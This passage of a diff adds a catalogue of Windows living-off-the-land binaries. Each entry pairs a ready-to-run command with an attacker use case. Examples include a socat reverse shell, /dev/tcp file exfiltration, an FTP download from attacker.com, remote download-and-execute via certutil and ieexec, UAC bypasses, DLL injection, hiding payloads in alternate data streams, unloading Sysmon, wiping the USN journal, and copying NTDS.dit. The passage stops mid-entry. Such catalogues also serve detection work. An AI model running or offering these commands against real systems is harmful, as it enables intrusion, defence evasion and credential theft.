@@ -1,0 +1,2240 @@
+
+Name : AddinUtil.exe
+Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
+Description : AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload.
+Usecase : Proxy execution of malicious serialized payload
+                               
+Name : AppInstaller.exe
+Command : start ms-appinstaller://?source={REMOTEURL:.exe}
+Description : AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.
+Usecase : Download file from Internet
+                               
+Name : Aspnet_Compiler.exe
+Command : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
+Description : Execute C# code with the Build Provider and proper folder structure in place.
+Usecase : Execute proxied payload with Microsoft signed binary to bypass application control solutions
+                               
+Name : At.exe
+Command : C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}
+Description : Create a recurring task to execute every day at a specific time.
+Usecase : Create a recurring task, to eg. to keep reverse shell session(s) alive
+                               
+Name : Atbroker.exe
+Command : ATBroker.exe /start malware
+Description : Start a registered Assistive Technology (AT).
+Usecase : Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.
+                               
+Name : Bash.exe
+Command : bash.exe -c "{CMD}"
+Description : Executes executable from bash.exe
+Usecase : Performs execution of specified file, can be used as a defensive evasion.
+                               
+Name : Bash.exe
+Command : bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+Description : Executes a reverse shell
+Usecase : Performs execution of specified file, can be used as a defensive evasion.
+                               
+Name : Bash.exe
+Command : bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
+Description : Exfiltrate data
+Usecase : Performs execution of specified file, can be used as a defensive evasion.
+                               
+Name : Bash.exe
+Command : bash.exe -c "{CMD}"
+Description : Executes executable from bash.exe
+Usecase : Performs execution of specified file, can be used to bypass Application Whitelisting.
+                               
+Name : Bitsadmin.exe
+Command : bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
+Description : Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.
+Usecase : Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.
+                               
+Name : Bitsadmin.exe
+Command : bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+Description : Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.
+Usecase : Download file from Internet
+                               
+Name : Bitsadmin.exe
+Command : bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+Description : Command for copying cmd.exe to another folder
+Usecase : Copy file
+                               
+Name : Bitsadmin.exe
+Command : bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
+Description : One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.
+Usecase : Execute binary file specified. Can be used as a defensive evasion.
+                               
+Name : CertOC.exe
+Command : certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
+Description : Loads the target DLL file
+Usecase : Execute code within DLL file
+                               
+Name : CertOC.exe
+Command : certoc.exe -GetCACAPS {REMOTEURL:.ps1}
+Description : Downloads text formatted files
+Usecase : Download scripts, webshells etc.
+                               
+Name : CertReq.exe
+Command : CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
+Description : Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).
+Usecase : Download file from Internet
+                               
+Name : CertReq.exe
+Command : CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
+Description : Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.
+Usecase : Upload
+                               
+Name : Certutil.exe
+Command : certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
+Description : Download and save an executable to disk in the current folder.
+Usecase : Download file from Internet
+                               
+Name : Certutil.exe
+Command : certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
+Description : Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.
+Usecase : Download file from Internet
+                               
+Name : Certutil.exe
+Command : certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
+Description : Download and save a .ps1 file to an Alternate Data Stream (ADS).
+Usecase : Download file from Internet and save it in an NTFS Alternate Data Stream
+                               
+Name : Certutil.exe
+Command : certutil.exe -URL {REMOTEURL:.exe}
+Description : Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.
+Usecase : Download file from Internet
+                               
+Name : Certutil.exe
+Command : certutil -encode {PATH} {PATH:.base64}
+Description : Command to encode a file using Base64
+Usecase : Encode files to evade defensive measures
+                               
+Name : Certutil.exe
+Command : certutil -decode {PATH:.base64} {PATH}
+Description : Command to decode a Base64 encoded file.
+Usecase : Decode files to evade defensive measures
+                               
+Name : Certutil.exe
+Command : certutil -decodehex {PATH:.hex} {PATH}
+Description : Command to decode a hexadecimal-encoded file.
+Usecase : Decode files to evade defensive measures
+                               
+Name : Change.exe
+Command : change.exe user
+Description : Once executed, `change.exe` will execute `chgusr.exe` in the same folder. Thus, if `change.exe` is copied to a folder and an arbitrary executable is renamed to `chgusr.exe`, `change.exe` will spawn it. Instead of `user`, it is also possible to use `port` or `logon` as command-line option.
+Usecase : Execute an arbitrary executable via trusted system executable.
+                               
+Name : Cipher.exe
+Command : cipher /w:{PATH_ABSOLUTE:folder}
+Description : Zero out a file
+Usecase : Can be used to forensically erase a file
+                               
+Name : Cmd.exe
+Command : cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
+Description : Add content to an Alternate Data Stream (ADS).
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : Cmd.exe
+Command : cmd.exe - < {PATH}:payload.bat
+Description : Execute payload.bat stored in an Alternate Data Stream (ADS).
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : Cmd.exe
+Command : type {PATH_SMB} > {PATH_ABSOLUTE}
+Description : Downloads a specified file from a WebDAV server to the target file.
+Usecase : Download/copy a file from a WebDAV server
+                               
+Name : Cmd.exe
+Command : type {PATH_ABSOLUTE} > {PATH_SMB}
+Description : Uploads a specified file to a WebDAV server.
+Usecase : Upload a file to a WebDAV server
+                               
+Name : Cmdkey.exe
+Command : cmdkey /list
+Description : List cached credentials
+Usecase : Get credential information from host
+                               
+Name : cmdl32.exe
+Command : cmdl32 /vpn /lan %cd%\config
+Description : Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where "X" denotes a random number or letter.
+Usecase : Download file from Internet
+                               
+Name : Cmstp.exe
+Command : cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
+Description : Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
+Usecase : Execute code hidden within an inf file. Download and run scriptlets from internet.
+                               
+Name : Cmstp.exe
+Command : cmstp.exe /ni /s {REMOTEURL:.inf}
+Description : Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
+Usecase : Execute code hidden within an inf file. Execute code directly from Internet.
+                               
+Name : Colorcpl.exe
+Command : colorcpl {PATH}
+Description : Copies the referenced file to C:\Windows\System32\spool\drivers\color\.
+Usecase : Copies file(s) to a subfolder of a generally trusted folder (c:\Windows\System32), which can be used to hide files or make them blend into the environment.
+                               
+Name : ComputerDefaults.exe
+Command : ComputerDefaults.exe
+Description : Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\open\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set.
+Usecase : Execute a binary or script as a high-integrity process without a UAC prompt.
+                               
+Name : ConfigSecurityPolicy.exe
+Command : ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
+Description : Upload file, credentials or data exfiltration in general
+Usecase : Upload file
+                               
+Name : ConfigSecurityPolicy.exe
+Command : ConfigSecurityPolicy.exe {REMOTEURL}
+Description : It will download a remote payload and place it in INetCache.
+Usecase : Downloads payload from remote server
+                               
+Name : Conhost.exe
+Command : conhost.exe {CMD}
+Description : Execute a command line with conhost.exe as parent process
+Usecase : Use conhost.exe as a proxy binary to evade defensive counter-measures
+                               
+Name : Conhost.exe
+Command : conhost.exe --headless {CMD}
+Description : Execute a command line with conhost.exe as parent process
+Usecase : Specify --headless parameter to hide child process window (if applicable)
+                               
+Name : Control.exe
+Command : control.exe {PATH_ABSOLUTE}:evil.dll
+Description : Execute evil.dll which is stored in an Alternate Data Stream (ADS).
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : Control.exe
+Command : control.exe {PATH_ABSOLUTE:.cpl}
+Description : Execute .cpl file. A CPL is a DLL file with CPlApplet export function)
+Usecase : Use to execute code and bypass application whitelisting
+                               
+Name : Csc.exe
+Command : csc.exe -out:{PATH:.exe} {PATH:.cs}
+Description : Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path.
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : Csc.exe
+Command : csc -target:library {PATH:.cs}
+Description : Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name.
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : Cscript.exe
+Command : cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs
+Description : Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : CustomShellHost.exe
+Command : CustomShellHost.exe
+Description : Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder.
+Usecase : Can be used to evade defensive counter-measures
+                               
+Name : DataSvcUtil.exe
+Command : DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
+Description : Upload file, credentials or data exfiltration in general
+Usecase : Upload file
+                               
+Name : Desktopimgdownldr.exe
+Command : set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
+Description : Downloads the file and sets it as the computer's lockscreen
+Usecase : Download arbitrary files from a web server
+                               
+Name : DeviceCredentialDeployment.exe
+Command : DeviceCredentialDeployment
+Description : Grab the console window handle and set it to hidden
+Usecase : Can be used to stealthily run a console application (e.g. cmd.exe) in the background
+                               
+Name : Dfsvc.exe
+Command : rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+Description : Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
+Usecase : Use binary to bypass Application whitelisting
+                               
+Name : Diantz.exe
+Command : diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
+Description : Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
+Usecase : Hide data compressed into an Alternate Data Stream.
+                               
+Name : Diantz.exe
+Command : diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
+Description : Download and compress a remote file and store it in a CAB file on local machine.
+Usecase : Download and compress into a cab file.
+                               
+Name : Diantz.exe
+Command : diantz /f {PATH:.ddf}
+Description : Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.
+Usecase : Bypass command-line based detections
+                               
+Name : Diskshadow.exe
+Command : diskshadow.exe /s {PATH:.txt}
+Description : Execute commands using diskshadow.exe from a prepared diskshadow script.
+Usecase : Use diskshadow to exfiltrate data from VSS such as NTDS.dit
+                               
+Name : Diskshadow.exe
+Command : diskshadow> exec {PATH:.exe}
+Description : Execute commands using diskshadow.exe to spawn child process
+Usecase : Use diskshadow to bypass defensive counter measures
+                               
+Name : Dnscmd.exe
+Command : dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
+Description : Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
+Usecase : Remotely inject dll to dns server
+                               
+Name : Esentutl.exe
+Command : esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o
+Description : Copies the source VBS file to the destination VBS file.
+Usecase : Copies files from A to B
+                               
+Name : Esentutl.exe
+Command : esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o
+Description : Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
+Usecase : Copy file and hide it in an alternate data stream as a defensive counter measure
+                               
+Name : Esentutl.exe
+Command : esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o
+Description : Copies the source Alternate Data Stream (ADS) to the destination EXE.
+Usecase : Extract hidden file within alternate data streams
+                               
+Name : Esentutl.exe
+Command : esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o
+Description : Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.
+Usecase : Copy file and hide it in an alternate data stream as a defensive counter measure
+                               
+Name : Esentutl.exe
+Command : esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o
+Description : Copies the source EXE to the destination EXE file
+Usecase : Use to copy files from one unc path to another
+                               
+Name : Esentutl.exe
+Command : esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit}
+Description : Copies a (locked) file using Volume Shadow Copy
+Usecase : Copy/extract a locked file such as the AD Database
+                               
+Name : Eudcedit.exe
+Command : eudcedit
+Description : Once executed, the Private Charecter Editor will be opened - click OK, then click File -> Font Links. In the next window choose the option "Link with Selected Fonts" and click on Save As, then in the opened enter the command you want to execute.
+Usecase : Execute a binary or script as a high-integrity process without a UAC prompt.
+                               
+Name : Eventvwr.exe
+Command : eventvwr.exe
+Description : During startup, eventvwr.exe checks the registry value `HKCU\Software\Classes\mscfile\shell\open\command` for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.
+Usecase : Execute a binary or script as a high-integrity process without a UAC prompt.
+                               
+Name : Eventvwr.exe
+Command : ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
+Description : During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\Microsoft\EventV~1\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net
+Usecase : Execute a command to bypass security restrictions that limit the use of command-line interpreters.
+                               
+Name : Expand.exe
+Command : expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}
+Description : Copies source file to destination.
+Usecase : Use to copies the source file to the destination file
+                               
+Name : Expand.exe
+Command : expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}
+Description : Copies source file to destination.
+Usecase : Copies files from A to B
+                               
+Name : Expand.exe
+Command : expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat
+Description : Copies source file to destination Alternate Data Stream (ADS)
+Usecase : Copies files from A to B
+                               
+Name : Explorer.exe
+Command : explorer.exe /root,"{PATH_ABSOLUTE:.exe}"
+Description : Execute specified .exe with the parent process spawning from a new instance of explorer.exe
+Usecase : Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.
+                               
+Name : Explorer.exe
+Command : explorer.exe {PATH_ABSOLUTE:.exe}
+Description : Execute notepad.exe with the parent process spawning from a new instance of explorer.exe
+Usecase : Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.
+                               
+Name : Extexport.exe
+Command : Extexport.exe {PATH_ABSOLUTE:folder} foo bar
+Description : Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll.
+Usecase : Execute dll file
+                               
+Name : Extrac32.exe
+Command : extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
+Description : Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.
+Usecase : Extract data from cab file and hide it in an alternate data stream.
+                               
+Name : Extrac32.exe
+Command : extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
+Description : Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
+Usecase : Extract data from cab file and hide it in an alternate data stream.
+                               
+Name : Extrac32.exe
+Command : extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}
+Description : Copy the source file to the destination file and overwrite it.
+Usecase : Download file from UNC/WEBDav
+                               
+Name : Extrac32.exe
+Command : extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}
+Description : Command for copying file from one folder to another
+Usecase : Copy file
+                               
+Name : Findstr.exe
+Command : findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
+Description : Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.
+Usecase : Add a file to an alternate data stream to hide from defensive counter measures
+                               
+Name : Findstr.exe
+Command : findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
+Description : Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
+Usecase : Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
+                               
+Name : Findstr.exe
+Command : findstr /S /I cpassword \\sysvol\policies\*.xml
+Description : Search for stored password in Group Policy files stored on SYSVOL.
+Usecase : Find credentials stored in cpassword attrbute
+                               
+Name : Findstr.exe
+Command : findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
+Description : Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.
+Usecase : Download/Copy file from webdav server
+                               
+Name : Finger.exe
+Command : finger user@example.host.com | more +2 | cmd
+Description : Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.
+Usecase : Download malicious payload
+                               
+Name : fltMC.exe
+Command : fltMC.exe unload SysmonDrv
+Description : Unloads a driver used by security agents
+Usecase : Defense evasion
+                               
+Name : Forfiles.exe
+Command : forfiles /p c:\windows\system32 /m notepad.exe /c "{CMD}"
+Description : Executes specified command since there is a match for notepad.exe in the c:\windows\System32 folder.
+Usecase : Use forfiles to start a new process to evade defensive counter measures
+                               
+Name : Forfiles.exe
+Command : forfiles /p c:\windows\system32 /m notepad.exe /c "{PATH_ABSOLUTE}:evil.exe"
+Description : Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.
+Usecase : Use forfiles to start a new process from a binary hidden in an alternate data stream
+                               
+Name : Fsutil.exe
+Command : fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}
+Description : Zero out a file
+Usecase : Can be used to forensically erase a file
+                               
+Name : Fsutil.exe
+Command : fsutil.exe usn deletejournal /d c:
+Description : Delete the USN journal volume to hide file creation activity
+Usecase : Can be used to hide file creation activity
+                               
+Name : Fsutil.exe
+Command : fsutil.exe trace decode
+Description : Executes a pre-planted binary named netsh.exe from the current directory.
+Usecase : Spawn a pre-planted executable from fsutil.exe.
+                               
+Name : Ftp.exe
+Command : echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
+Description : Executes the commands you put inside the text file.
+Usecase : Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
+                               
+Name : Ftp.exe
+Command : cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+Description : Download
+Usecase : Spawn new process using ftp.exe. Ftp.exe downloads the binary.
+                               
+Name : Gpscript.exe
+Command : Gpscript /logon
+Description : Executes logon scripts configured in Group Policy.
+Usecase : Add local group policy logon script to execute file and hide from defensive counter measures
+                               
+Name : Gpscript.exe
+Command : Gpscript /startup
+Description : Executes startup scripts configured in Group Policy
+Usecase : Add local group policy logon script to execute file and hide from defensive counter measures
+                               
+Name : Hh.exe
+Command : HH.exe {REMOTEURL:.bat}
+Description : Open the target batch script with HTML Help.
+Usecase : Download files from url
+                               
+Name : Hh.exe
+Command : HH.exe {PATH_ABSOLUTE:.exe}
+Description : Executes specified executable with HTML Help.
+Usecase : Execute process with HH.exe
+                               
+Name : Hh.exe
+Command : HH.exe {REMOTEURL:.chm}
+Description : Executes a remote .chm file which can contain commands.
+Usecase : Execute commands with HH.exe
+                               
+Name : IMEWDBLD.exe
+Command : C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
+Description : IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.
+Usecase : Download file from Internet
+                               
+Name : Ie4uinit.exe
+Command : ie4uinit.exe -BaseSettings
+Description : Executes commands from a specially prepared ie4uinit.inf file.
+Usecase : Get code execution by copy files to another location
+                               
+Name : iediagcmd.exe
+Command : set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
+Description : Executes binary that is pre-planted at C:\test\system32\netsh.exe.
+Usecase : Spawn a pre-planted executable from iediagcmd.exe.
+                               
+Name : Ieexec.exe
+Command : ieexec.exe {REMOTEURL:.exe}
+Description : Downloads and executes executable from the remote server.
+Usecase : Download and run attacker code from remote location
+                               
+Name : Ieexec.exe
+Command : ieexec.exe {REMOTEURL:.exe}
+Description : Downloads and executes executable from the remote server.
+Usecase : Download and run attacker code from remote location
+                               
+Name : Ilasm.exe
+Command : ilasm.exe {PATH_ABSOLUTE:.txt} /exe
+Description : Binary file used by .NET to compile C#/intermediate (IL) code to .exe
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : Ilasm.exe
+Command : ilasm.exe {PATH_ABSOLUTE:.txt} /dll
+Description : Binary file used by .NET to compile C#/intermediate (IL) code to dll
+Usecase : A description of the usecase
+                               
+Name : Infdefaultinstall.exe
+Command : InfDefaultInstall.exe {PATH:.inf}
+Description : Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.
+Usecase : Code execution
+                               
+Name : Installutil.exe
+Command : InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+Description : Execute the target .NET DLL or EXE.
+Usecase : Use to execute code and bypass application whitelisting
+                               
+Name : Installutil.exe
+Command : InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+Description : Execute the target .NET DLL or EXE.
+Usecase : Use to execute code and bypass application whitelisting
+                               
+Name : Installutil.exe
+Command : InstallUtil.exe {REMOTEURL}
+Description : It will download a remote payload and place it in INetCache.
+Usecase : Downloads payload from remote server
+                               
+Name : iscsicpl.exe
+Command : c:\windows\syswow64\iscsicpl.exe
+Description : c:\windows\syswow64\iscsicpl.exe has a DLL injection through `C:\Users\<username>\AppData\Local\Microsoft\WindowsApps\ISCSIEXE.dll`, resulting in UAC bypass.
+Usecase : Execute a custom DLL via a trusted high-integrity process without a UAC prompt.
+                               
+Name : iscsicpl.exe
+Command : iscsicpl.exe
+Description : Both `c:\windows\system32\iscsicpl.exe` and `c:\windows\system64\iscsicpl.exe` have UAC bypass through launching iscicpl.exe, then navigating into the Configuration tab, clicking Report, then launching your custom command.
+Usecase : Execute a binary or script as a high-integrity process without a UAC prompt.
+                               
+Name : Jsc.exe
+Command : jsc.exe {PATH:.js}
+Description : Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name.
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : Jsc.exe
+Command : jsc.exe /t:library {PATH:.js}
+Description : Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : Ldifde.exe
+Command : Ldifde -i -f {PATH:.ldf}
+Description : Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.
+Usecase : Download file from Internet
+                               
+Name : Makecab.exe
+Command : makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
+Description : Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
+Usecase : Hide data compressed into an alternate data stream
+                               
+Name : Makecab.exe
+Command : makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
+Description : Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
+Usecase : Hide data compressed into an alternate data stream
+                               
+Name : Makecab.exe
+Command : makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
+Description : Download and compresses the target file and stores it in the target file.
+Usecase : Download file and compress into a cab file
+                               
+Name : Makecab.exe
+Command : makecab /F {PATH:.ddf}
+Description : Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.
+Usecase : Bypass command-line based detections
+                               
+Name : Mavinject.exe
+Command : MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
+Description : Inject evil.dll into a process with PID 3110.
+Usecase : Inject dll file into running process
+                               
+Name : Mavinject.exe
+Command : Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll
+Description : Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172
+Usecase : Inject dll file into running process
+                               
+Name : Microsoft.Workflow.Compiler.exe
+Command : Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+Description : Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted).
+Usecase : Compile and run code
+                               
+Name : Microsoft.Workflow.Compiler.exe
+Command : Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+Description : Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.
+Usecase : Compile and run code
+                               
+Name : Microsoft.Workflow.Compiler.exe
+Command : Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+Description : Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.
+Usecase : Compile and run code
+                               
+Name : Mmc.exe
+Command : mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
+Description : Launch a 'backgrounded' MMC process and invoke a COM payload
+Usecase : Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry
+                               
+Name : Mmc.exe
+Command : mmc.exe gpedit.msc
+Description : Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.
+Usecase : Modify HKCU\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.
+                               
+Name : Mmc.exe
+Command : mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
+Description : Download and save an executable to disk
+Usecase : Download file from Internet
+                               
+Name : MpCmdRun.exe
+Command : MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
+Description : Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
+Usecase : Download file
+                               
+Name : MpCmdRun.exe
+Command : copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
+Description : Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.
+Usecase : Download file
+                               
+Name : MpCmdRun.exe
+Command : MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
+Description : Download file to machine and store it in Alternate Data Stream
+Usecase : Hide downloaded data into an Alternate Data Stream
+                               
+Name : Msbuild.exe
+Command : msbuild.exe {PATH:.xml}
+Description : Build and execute a C# project stored in the target XML file.
+Usecase : Compile and run code
+                               
+Name : Msbuild.exe
+Command : msbuild.exe {PATH:.csproj}
+Description : Build and execute a C# project stored in the target csproj file.
+Usecase : Compile and run code
+                               
+Name : Msbuild.exe
+Command : msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo
+Description : Executes generated Logger DLL file with TargetLogger export.
+Usecase : Execute DLL
+                               
+Name : Msbuild.exe
+Command : msbuild.exe {PATH:.proj}
